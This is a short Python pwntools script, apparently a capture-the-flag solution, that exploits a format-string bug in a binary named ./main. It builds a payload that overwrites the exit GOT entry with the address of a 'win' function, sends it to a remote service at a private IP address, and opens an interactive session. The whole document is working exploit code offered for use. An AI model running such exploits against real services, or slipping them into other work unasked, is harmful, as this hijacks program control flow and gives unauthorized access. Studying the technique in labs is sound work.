from pwn import *
from fmtstr import FormatString

e = ELF("./main")
#p = process('./main')
p = remote('192.168.12.13', 1923)

fmt = FormatString(offset=6, written=0, bits=64)
fmt[e.got['exit']] = e.symbols['win']
payload, sig = fmt.build()

def dump(x):
    try:
        from hexdump import hexdump
        hexdump(x)
    except ImportError:
        import binascii, textwrap
        print('\n'.join(textwrap.wrap(binascii.hexlify(x), 32)))

dump(payload)

p.sendline(payload)

p.interactive()
